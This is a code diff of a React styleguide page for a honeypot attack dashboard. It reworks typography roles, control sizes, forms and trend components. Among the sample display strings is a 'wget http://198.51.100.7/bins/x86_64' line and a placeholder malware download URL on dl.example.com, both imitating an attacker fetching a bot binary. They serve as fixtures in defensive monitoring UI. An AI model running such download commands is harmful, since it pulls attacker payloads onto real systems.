@@ -2,17 +2,14 @@ import { Inbox, Plus, RefreshCw } from "lucide-react"
 import { useState } from "react"
 import { AttackerRow } from "@/components/attacker-row"
 import { DayBars } from "@/components/charts/day-bars"
-import { SensorActivityChart } from "@/components/charts/sensor-activity-chart"
 import { CountryFlag } from "@/components/country-flag"
 import { TERMINAL_BG, TERMINAL_THEME } from "@/components/replay/terminal-theme"
 import { SegmentedControl } from "@/components/segmented-control"
 import { TopList } from "@/components/top-list"
 import { InsightRow } from "@/components/insights/insights-card"
 import { CopyDefanged } from "@/components/trends/copy-defanged"
-import { Heatmap } from "@/components/trends/heatmap"
-import { MalwareRow } from "@/components/trends/malware-row"
 import { NewList } from "@/components/trends/new-list"
-import { TagChart } from "@/components/trends/tag-chart"
+import { TagTable } from "@/components/trends/tag-table"
 import { EmptyState } from "@/components/empty-state"
 import { EventRow } from "@/components/event-row"
 import { FilterBar, SensorFilter } from "@/components/filter-bar"
@@ -35,17 +32,26 @@ import { FamilyTile } from "@/components/family-tile"
 import { StatTile } from "@/components/stat-tile"
 import { TagBadge } from "@/components/tag-badge"
 import { ThemeToggle } from "@/components/theme-toggle"
+import { ScannerBadge } from "@/components/scanner-badge"
+import { Badge } from "@/components/ui/badge"
 import { Button } from "@/components/ui/button"
-import { useTheme } from "@/app/theme"
+import { Checkbox } from "@/components/ui/checkbox"
+import { Input } from "@/components/ui/input"
 import {
-  type Attacker,
-  type LiveEvent,
-  type SensorEvent,
-  type Session,
-  type TimePoint,
-} from "@/lib/api"
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select"
+import { Switch } from "@/components/ui/switch"
+import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
+import { Textarea } from "@/components/ui/textarea"
+import { Field as FormField, UnsavedHint } from "@/components/form-parts"
+import { useTheme } from "@/app/theme"
+import { type Attacker, type LiveEvent, type SensorEvent, type Session } from "@/lib/api"
 import type { DayPoint } from "@/lib/chart-time"
-import type { HeatmapCell, Insight, MalwareItem, NewItem, TagPoint } from "@/lib/trends"
+import type { Insight, NewItem, TagPoint } from "@/lib/trends"
 import { contrastRatio, parseHex, readTokenBlock } from "@/lib/contrast"
 import { FAMILY_META, SENSOR_FAMILIES, SENSOR_META } from "@/lib/sensors"
 import { SEVERITIES } from "@/lib/severity"
@@ -229,27 +235,6 @@ const SAMPLE_LIVE: Record<string, { events: number; sessions: number }> = {
 }
 
 const HOUR = 3_600_000
-const SAMPLE_POINTS: TimePoint[] = Array.from({ length: 12 }, (_, i) => {
-  const w = [3, 5, 4, 8, 12, 9, 7, 11, 14, 10, 6, 8][i] ?? 5
-  return {
-    ts: new Date(Date.now() - (11 - i) * HOUR).toISOString(),
-    events: {
-      ssh: w * 30,
-      telnet: w * 12,
-      adb: w * 2,
-      web: w * 9,
-      docker: w * 3,
-      redis: w * 11,
-      mysql: w * 6,
-      mssql: w * 4,
-      rdp: w * 3,
-      smb: w * 14,
-      sip: w,
-      synology: w * 2,
-    },
-    sessions: { ssh: w * 3, telnet: w, web: w, redis: w, smb: w * 2, rdp: 1 },
-  }
-})
 const SAMPLE_DAYS: DayPoint[] = Array.from({ length: 14 }, (_, i) => ({
   day: new Date(Date.now() - (13 - i) * 24 * HOUR).toISOString().slice(0, 10),
   events: [0, 4, 0, 12, 8, 0, 0, 22, 15, 9, 0, 31, 18, 64][i] ?? 0,
@@ -310,30 +295,10 @@ const SAMPLE_TAGS: TagPoint[] = Array.from({ length: 7 }, (_, i) => ({
     other: 8,
   },
 }))
-const SAMPLE_HEAT: HeatmapCell[] = Array.from({ length: 7 * 24 }, (_, k) => {
-  const dow = Math.floor(k / 24)
-  const hour = k % 24
-  const day = hour >= 8 && hour <= 20 ? 1 : 0.25
-  return { dow, hour, events: Math.round((dow === 1 ? 2.2 : 1) * day * (30 + ((k * 37) % 50))) }
-})
 const SAMPLE_NEW: NewItem[] = [
   { value: "svc_backup", count: 103, first_seen: new Date(Date.now() - 12 * HOUR).toISOString() },
   { value: "deploy-bot", count: 74, first_seen: new Date(Date.now() - 72 * HOUR).toISOString() },
 ]
-const SAMPLE_MALWARE: MalwareItem = {
-  url: "http://dl.example.com/bins/x86_64",
-  host: "dl.example.com",
-  first_seen: new Date(Date.now() - 5 * 24 * HOUR).toISOString(),
-  last_seen: new Date(Date.now() - HOUR).toISOString(),
-  attempts: 246,
-  sessions: 197,
-  ips: 74,
-  tools: ["wget", "curl"],
-  sensors: ["ssh", "telnet"],
-  sha256: null,
-  size: null,
-  virustotal_url: null,
-}
 const TERMINAL_COLOURS = [
   "foreground",
   "red",
@@ -396,6 +361,52 @@ function Swatch({ name, value, onSurface }: { name: string; value?: string; onSu
  * Page
  * ------------------------------------------------------------------------- */
 
+/* The type roles of index.css, in the order a page uses them. */
+const TYPE_ROLES = [
+  ["type-figure", "type-figure", "28/34, 36/42 from sm · 600", "headline figures", "18,342"],
+  ["type-kpi", "type-kpi", "28/34 · 600", "KPI values", "1,260 sessions"],
+  ["type-page-title", "type-page-title", "22/28 · 600", "page title (h1)", "Attacks"],
+  ["type-section-title", "type-section-title", "18/26 · 600", "section, dialog, sheet", "Entries"],
+  [
+    "type-card-title",
+    "type-card-title",
+    "14/22 · 500",
+    "card title, finding",
+    "PHP exploit attempts tripled since Tuesday.",
+  ],
+  ["type-lede", "type-lede", "14/22 · 400", "page sentence", "380 sessions from 265 addresses."],
+  ["type-subtitle", "type-subtitle", "13/20 · 500", "heading inside a card", "Recent sessions"],
+  [
+    "text-sm",
+    "text-sm",
+    "13/20 · 400",
+    "body, table text",
+    "203.0.113.9 tried 37 SSH passwords, then ran 5 commands.",
+  ],
+  [
+    "type-eyebrow text-fg-muted",
+    "type-eyebrow",
+    "12/18 · 500",
+    "card label, KPI label",
+    "Activity by sensor",
+  ],
+  [
+    "text-xs text-fg-muted",
+    "text-xs",
+    "12/18 · 400",
+    "meta, hints, sm controls",
+    "Started 4 min ago",
+  ],
+  ["type-column text-fg-subtle", "type-column", "11/16 · 500 · caps", "column labels", "Last seen"],
+  [
+    "font-mono text-xs",
+    "font-mono",
+    "12/18 · 400",
+    "addresses, commands",
+    "wget http://198.51.100.7/bins/x86_64",
+  ],
+] as const
+
 const TOC = [
   ["colour", "Colour"],
   ["sensors", "Sensors"],
@@ -419,7 +430,7 @@ export function StyleguidePage() {
   const [speed, setSpeed] = useState("1")
 
   const addEvent = () => {
-    const template = EVENTS[Math.floor(Math.random() * EVENTS.length)]
+    const template = EVENTS[nextId % EVENTS.length]
     if (!template) return
     const e = { ...template, id: nextId++, ts: new Date().toISOString() }
     setNewestId(e.id)
@@ -599,38 +610,20 @@ export function StyleguidePage() {
       <Section
         id="type"
         title="Type"
-        description="Inter for text, JetBrains Mono for addresses, commands and hashes. Tabular figures everywhere so numbers line up."
+        description="Inter for text, JetBrains Mono for addresses, commands and hashes. Tabular figures everywhere so numbers line up. Titles and figures use a role, never a raw size, so a card title is the same size on every page."
       >
         <div className="divide-y rounded-lg border bg-surface shadow-sm">
-          {(
-            [
-              ["text-3xl font-semibold tracking-tight", "3xl · 36/42", "18,342 events"],
-              [
-                "text-2xl font-semibold tracking-tight",
-                "2xl · 28/34 · KPI value",
-                "1,260 sessions",
-              ],
-              ["text-xl font-semibold tracking-tight", "xl · 22/28 · page title", "Attacks"],
-              ["text-lg font-medium", "lg · 18/26 · section", "Session timeline"],
-              [
-                "text-base font-medium",
-                "base · 14/22 · card finding",
-                "PHP exploit attempts tripled since Tuesday.",
-              ],
-              [
-                "text-sm",
-                "sm · 13/20 · default UI",
-                "203.0.113.9 tried 37 SSH passwords, then ran 5 commands.",
-              ],
-              ["text-xs text-fg-muted", "xs · 12/16 · labels", "Started 4 min ago"],
-              ["font-mono text-xs", "mono · 12/16", "wget http://198.51.100.7/bins/x86_64"],
-            ] as const
-          ).map(([cls, meta, text]) => (
+          {TYPE_ROLES.map(([cls, name, meta, use, text]) => (
             <div
-              key={meta}
-              className="flex flex-col gap-1 px-4 py-3 sm:flex-row sm:items-baseline sm:gap-6"
+              key={name}
+              className="grid grid-cols-1 gap-x-6 gap-y-1 px-4 py-3 sm:px-5 md:grid-cols-[15rem_minmax(0,1fr)] md:items-baseline"
             >
-              <span className="w-48 shrink-0 font-mono text-2xs text-fg-subtle">{meta}</span>
+              <div className="min-w-0">
+                <p className="font-mono text-xs text-fg">{name}</p>
+                <p className="text-xs text-fg-subtle">
+                  {meta} · {use}
+                </p>
+              </div>
               <span className={cn("min-w-0 truncate text-fg", cls)}>{text}</span>
             </div>
           ))}
@@ -640,12 +633,73 @@ export function StyleguidePage() {
       <Section
         id="space"
         title="Space & shape"
-        description="A 4 px grid. Controls use 6 px radius, cards 12 px, chips 4 px. Dark elevation is a border plus a faint top highlight; light adds a soft shadow."
+        description="A 4 px grid, three control heights, one chip height and three radii. Dark elevation is a border plus a faint top highlight; light adds a soft shadow."
       >
-        <div className="grid grid-cols-1 gap-4 lg:grid-cols-3">
-          <Specimen label="Spacing (4 px grid)" className="lg:col-span-1">
+        <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
+          <Specimen label="Control heights: sm 32 (rows, filters), default 36 (forms), lg 40 (one page action). 40 on touch.">
+            <div className="flex w-full flex-col gap-3">
+              {(
+                [
+                  ["sm", "32"],
+                  ["default", "36"],
+                  ["lg", "40"],
+                ] as const
+              ).map(([size, px]) => (
+                <div key={size} className="flex flex-wrap items-center gap-2">
+                  <span className="w-16 font-mono text-xs text-fg-subtle">{px} px</span>
+                  <Button size={size}>Primary</Button>
+                  <Button size={size} variant="outline">
+                    <Plus aria-hidden /> Outline
+                  </Button>
+                  <Input
+                    size={size}
+                    aria-label={`Sample ${size} input`}
+                    placeholder="Search"
+                    className="w-32"
+                  />
+                </div>
+              ))}
+            </div>
+          </Specimen>
+          <Specimen label="One row, one baseline: every control in a filter bar is sm">
+            <SensorFilter />
+            <SegmentedControl
+              label="Window"
+              value={sort}
+              onChange={setSort}
+              options={[
+                { value: "last_seen", label: "24 h" },
+                { value: "sessions", label: "7 days" },
+                { value: "events", label: "30 days" },
+              ]}
+            />
+            <Input size="sm" aria-label="Sample search" placeholder="IP prefix" className="w-36" />
+            <Button variant="outline" size="sm">
+              Export
+            </Button>
+          </Specimen>
+          <Specimen label="Chips are 22 px, icons 14 px, sans 12 px or mono 11 px">
+            <SensorBadge sensor="ssh" />
+            <SeverityBadge severity="warning" />
+            <TagBadge tag="crypto-miner" />
+            <IPChip ip="203.0.113.9" />
+            <ScannerBadge />
+            <Badge variant="outline">Outline</Badge>
+          </Specimen>
+          <Specimen label="Icons: 14 px next to 12 px text, 16 px in controls and next to 13 to 14 px text, 20 px in empty states">
+            {([14, 16, 20] as const).map((n) => (
+              <span
+                key={n}
+                className="inline-flex items-center gap-1.5 font-mono text-xs text-fg-subtle"
+              >
+                <Inbox aria-hidden style={{ width: n, height: n }} className="text-fg" />
+                {n}
+              </span>
+            ))}
+          </Specimen>
+          <Specimen label="Spacing (4 px grid): 16 px between cards, 16 / 20 px inside, 24 px or more between sections">
             <div className="flex items-end gap-2">
-              {[1, 2, 3, 4, 6, 8, 10, 12].map((n) => (
+              {[1, 2, 3, 4, 5, 6, 8, 10, 12].map((n) => (
                 <div key={n} className="flex flex-col items-center gap-1.5">
                   <div className="w-3 rounded-xs bg-fg-subtle" style={{ height: n * 4 }} />
                   <span className="font-mono text-2xs text-fg-subtle">{n * 4}</span>
@@ -653,7 +707,7 @@ export function StyleguidePage() {
               ))}
             </div>
           </Specimen>
-          <Specimen label="Radius">
+          <Specimen label="Radius: 6 chips, 8 controls, 12 cards (selfhostr plate, button, card)">
             {(
               [
                 ["rounded-xs", "4"],
@@ -669,7 +723,7 @@ export function StyleguidePage() {
               </div>
             ))}
           </Specimen>
-          <Specimen label="Elevation">
+          <Specimen label="Elevation" className="lg:col-span-2">
             {(["shadow-sm", "shadow-md", "shadow-lg"] as const).map((cls) => (
               <div
                 key={cls}
@@ -719,7 +773,7 @@ export function StyleguidePage() {
                 variant="outline"
                 size="sm"
                 className="w-full"
-                onClick={() => setCounter((c) => c + Math.round(37 + Math.random() * 400))}
+                onClick={() => setCounter((c) => c + 37 + ((c * 7) % 400))}
               >
                 <RefreshCw aria-hidden /> Bump counter
               </Button>
@@ -733,16 +787,63 @@ export function StyleguidePage() {
         title="Components"
         description="shadcn/ui primitives restyled through tokens, plus the SuckerPot building blocks."
       >
-        <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
-          <Specimen label="Button">
+        <div className="grid grid-cols-1 gap-4 lg:grid-flow-row-dense lg:grid-cols-2">
+          <Specimen label="Button: one primary per view, neutral, never a hue">
             <Button>Primary</Button>
             <Button variant="outline">Outline</Button>
             <Button variant="secondary">Secondary</Button>
             <Button variant="ghost">Ghost</Button>
-            <Button variant="outline" size="sm">
-              Small
+            <Button variant="outline" size="icon" aria-label="Refresh">
+              <RefreshCw aria-hidden />
             </Button>
             <Button disabled>Disabled</Button>
+          </Specimen>
+          <Specimen
+            label="Form: label 13/500, control 36 px, hint 12 px, Save at the same height"
+            className="lg:col-span-2"
+          >
+            <form className="grid w-full gap-4 sm:grid-cols-2" onSubmit={(e) => e.preventDefault()}>
+              <FormField id="sg-name" label="Mailbox" hint="Where the replies arrive.">
+                <Input id="sg-name" placeholder="abuse@example.org" />
+              </FormField>
+              <FormField id="sg-mode" label="Send" optional>
+                <Select defaultValue="digest">
+                  <SelectTrigger id="sg-mode" className="w-full">
+                    <SelectValue />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value="digest">Once a day</SelectItem>
+                    <SelectItem value="now">Right away</SelectItem>
+                  </SelectContent>
+                </Select>
+              </FormField>
+              <div className="sm:col-span-2">
+                <FormField id="sg-note" label="Note">
+                  <Textarea id="sg-note" placeholder="Shown at the top of every report." />
+                </FormField>
+              </div>
+              <label className="flex items-center gap-2 text-sm text-fg">
+                <Switch defaultChecked aria-label="Send automatically" /> Send automatically
+              </label>
+              <label className="flex items-center gap-2 text-sm text-fg">
+                <Checkbox defaultChecked /> Include the evidence
+              </label>
+              <div className="flex items-center gap-3 sm:col-span-2">
+                <Button type="submit">Save</Button>
+                <UnsavedHint show />
+              </div>
+            </form>
+          </Specimen>
+          <Specimen label="Tabs (Settings sections): one strip, the open tab underlined">
+            <Tabs defaultValue="general" className="w-full">
+              <TabsList variant="line" className="max-w-full justify-start overflow-x-auto">
+                {["General", "Keys", "Users", "Alert channels"].map((t) => (
+                  <TabsTrigger key={t} value={t.toLowerCase()} className="flex-none px-3">
+                    {t}
+                  </TabsTrigger>
+                ))}
+              </TabsList>
+            </Tabs>
           </Specimen>
           <Specimen label="TagBadge (neutral · warning triangle · severe diamond)">
             <TagBadge tag="recon" />
@@ -792,7 +893,7 @@ export function StyleguidePage() {
               <Meter value={97} max={100} label="Disk, critical" valueText="97%" tone="severe" />
             </div>
           </Specimen>
-          <Specimen label="MaskToggle (screenshot mode, also ?mask=1)">
+          <Specimen label="MaskToggle (screenshot mode, also ?mask=1)" className="lg:col-span-2">
             <MaskToggle className="w-full max-w-56" />
             <IPChip ip="203.0.113.77" />
             <span className="font-mono text-xs text-fg-muted">→ masked: 203.0.x.x</span>
@@ -902,7 +1003,7 @@ export function StyleguidePage() {
             ))}
           </div>
           <div className="border-y px-4 py-2 font-mono text-2xs text-fg-subtle sm:px-5">
-            LiveEventRow compact (LatestEventsCard)
+            LiveEventRow compact
           </div>
           {LIVE_EVENTS.slice(0, 3).map((e, i) => (
             <div key={e.id} className={cn(i > 0 && "border-t")}>
@@ -943,14 +1044,7 @@ export function StyleguidePage() {
       >
         <div className="grid grid-cols-1 gap-4 lg:grid-cols-5">
           <FindingCard
-            className="lg:col-span-3"
-            eyebrow="SensorActivityChart"
-            finding="SSH drew 60% of all events in the last 12 hours."
-          >
-            <SensorActivityChart points={SAMPLE_POINTS} />
-          </FindingCard>
-          <FindingCard
-            className="lg:col-span-2"
+            className="lg:col-span-5"
             eyebrow="TopList"
             finding='"root" was the most tried username.'
           >
@@ -1015,7 +1109,7 @@ export function StyleguidePage() {
       <Section
         id="trends"
         title="Trends, malware and insights"
-        description="Neutral by default. Only the tag the finding is about is red; the heatmap is a five-step neutral scale with a readout line."
+        description="Neutral by default. Only the tag the finding is about is red; the tag table keeps a sparkline per tag and a change column."
       >
         <div className="grid grid-cols-1 gap-4">
           <FindingCard
@@ -1028,17 +1122,11 @@ export function StyleguidePage() {
             ))}
           </FindingCard>
           <FindingCard
-            eyebrow="TagChart"
+            eyebrow="TagTable"
             finding={'"php2shell" is the most common tag, and the only one painted red.'}
-            detail="Other payload tags keep a red-outlined diamond in the legend."
+            detail="Other payload tags keep a red-outlined diamond."
           >
-            <TagChart points={SAMPLE_TAGS} />
-          </FindingCard>
-          <FindingCard
-            eyebrow="Heatmap"
-            finding="Tuesday afternoon is the busiest time, in your time zone."
-          >
-            <Heatmap cells={SAMPLE_HEAT} offsetHours={0} />
+            <TagTable points={SAMPLE_TAGS} />
           </FindingCard>
           <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
             <FindingCard eyebrow="NewList" finding="2 usernames were never seen before this week.">
@@ -1048,14 +1136,6 @@ export function StyleguidePage() {
               <code className="font-mono text-xs text-fg">http://dl.example.com/bins/x86_64</code>
               <CopyDefanged url="http://dl.example.com/bins/x86_64" />
             </Specimen>
-          </div>
-          <div className="overflow-hidden rounded-lg border bg-surface shadow-sm">
-            <div className="border-b px-4 py-2 font-mono text-2xs text-fg-subtle sm:px-5">
-              MalwareRow (Malware list; URLs are text, never links)
-            </div>
-            <div role="list" aria-label="Malware samples">
-              <MalwareRow item={SAMPLE_MALWARE} onOpen={() => undefined} showHash={false} />
-            </div>
           </div>
         </div>
       </Section>
